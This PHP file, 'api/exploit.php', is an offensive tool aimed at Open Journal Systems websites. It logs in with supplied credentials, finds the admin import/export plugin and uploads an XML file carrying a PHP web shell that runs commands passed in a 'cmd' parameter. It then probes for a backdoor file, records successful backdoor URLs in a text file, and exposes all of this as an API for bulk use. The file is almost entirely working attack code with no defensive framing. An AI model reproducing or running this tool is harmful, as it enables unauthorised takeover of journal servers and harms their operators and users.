<?php
// api/exploit.php
class OJSExploitPro {
    private $url;
    private $username;
    private $password;
    private $timeout;
    private $cookieFile;
    private $userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ];
    
    public function __construct($url, $username, $password, $timeout = 15) {
        $this->url = rtrim($url, '/');
        $this->username = $username;
        $this->password = $password;
        $this->timeout = $timeout;
        $this->cookieFile = tempnam(sys_get_temp_dir(), 'cookie_');
    }
    
    private function getRandomUserAgent() {
        return $this->userAgents[array_rand($this->userAgents)];
    }
    
    private function request($url, $method = 'GET', $data = null, $headers = []) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_COOKIEFILE => $this->cookieFile,
            CURLOPT_COOKIEJAR => $this->cookieFile,
            CURLOPT_USERAGENT => $this->getRandomUserAgent(),
            CURLOPT_HEADER => true
        ]);
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($data) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
        }
        
        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        
        $response = curl_exec($ch);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        
        curl_close($ch);
        
        return [
            'headers' => $headers,
            'body' => $body
        ];
    }
    
    private function extractCSRF($html) {
        if (preg_match('/name="csrfToken" value="([^"]+)"/', $html, $matches)) {
            return $matches[1];
        }
        if (preg_match('/csrfToken["\']?\s*:\s*["\']([^"\']+)["\']/', $html, $matches)) {
            return $matches[1];
        }
        return '';
    }
    
    public function login() {
        $loginUrls = [
            $this->url . '/index.php/index/login',
            $this->url . '/index.php/user/login',
            $this->url . '/index.php/index/signIn',
            $this->url . '/index.php/index'
        ];
        
        foreach ($loginUrls as $loginUrl) {
            $response = $this->request($loginUrl);
            $csrfToken = $this->extractCSRF($response['body']);
            
            $postData = http_build_query([
                'csrfToken' => $csrfToken,
                'username' => $this->username,
                'password' => $this->password,
                'remember' => '1'
            ]);
            
            $loginResponse = $this->request($loginUrl . '/signIn', 'POST', $postData, [
                'Content-Type: application/x-www-form-urlencoded'
            ]);
            
            if (strpos($loginResponse['headers'], 'Location:') !== false) {
                return true;
            }
            
            // Check if already logged in
            $checkResponse = $this->request($this->url);
            if (strpos($checkResponse['body'], 'logout') !== false || 
                strpos($checkResponse['body'], 'dashboard') !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    public function checkAdmin() {
        $adminPaths = [
            $this->url . '/index.php/index/management/importexport/plugin/NativeImportExportPlugin',
            $this->url . '/index.php/management/importexport/plugin/NativeImportExportPlugin',
            $this->url . '/management/importexport/plugin/NativeImportExportPlugin'
        ];
        
        foreach ($adminPaths as $path) {
            $response = $this->request($path);
            if (strpos($response['body'], 'importXmlForm') !== false ||
                strpos($response['body'], 'NativeImportExportPlugin') !== false) {
                return ['url' => $path, 'html' => $response['body']];
            }
        }
        
        return null;
    }
    
    public function deployBackdoor($adminData) {
        $xmlContent = '<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <array>
            <dict>
                <key>name</key>
                <string>system</string>
                <key>value</key>
                <string><?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?></string>
            </dict>
        </array>
        </plist>';
        
        // Extract CSRF token
        $csrfToken = $this->extractCSRF($adminData['html']);
        
        // Upload XML
        $boundary = uniqid();
        $fileContent = "--$boundary\r\n";
        $fileContent .= "Content-Disposition: form-data; name=\"importedFile\"; filename=\"pkp.xml\"\r\n";
        $fileContent .= "Content-Type: application/xml\r\n\r\n";
        $fileContent .= $xmlContent . "\r\n";
        $fileContent .= "--$boundary--\r\n";
        
        $uploadResponse = $this->request($adminData['url'], 'POST', $fileContent, [
            "Content-Type: multipart/form-data; boundary=$boundary",
            "Content-Length: " . strlen($fileContent)
        ]);
        
        // Check if backdoor is accessible
        $backdoorPath = '/public/journals/tujuhdua.php';
        $checkBackdoor = $this->request($this->url . $backdoorPath);
        
        if ($checkBackdoor['body'] !== '') {
            return $this->url . $backdoorPath;
        }
        
        return false;
    }
    
    public function run() {
        $result = [
            'login' => false,
            'admin' => false,
            'backdoor' => false,
            'backdoor_url' => null
        ];
        
        // Login attempt
        $result['login'] = $this->login();
        
        if ($result['login']) {
            // Check admin access
            $adminData = $this->checkAdmin();
            if ($adminData) {
                $result['admin'] = true;
                
                // Deploy backdoor
                $backdoorUrl = $this->deployBackdoor($adminData);
                if ($backdoorUrl) {
                    $result['backdoor'] = true;
                    $result['backdoor_url'] = $backdoorUrl;
                    
                    // Save to database or file
                    file_put_contents('tembush.txt', $backdoorUrl . "\n", FILE_APPEND);
                }
            }
        }
        
        // Cleanup
        if (file_exists($this->cookieFile)) {
            unlink($this->cookieFile);
        }
        
        return $result;
    }
}

// Handle API request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    $exploit = new OJSExploitPro(
        $input['url'],
        $input['username'],
        $input['password'],
        $input['timeout'] ?? 15
    );
    
    $result = $exploit->run();
    
    header('Content-Type: application/json');
    echo json_encode($result);
}
?>
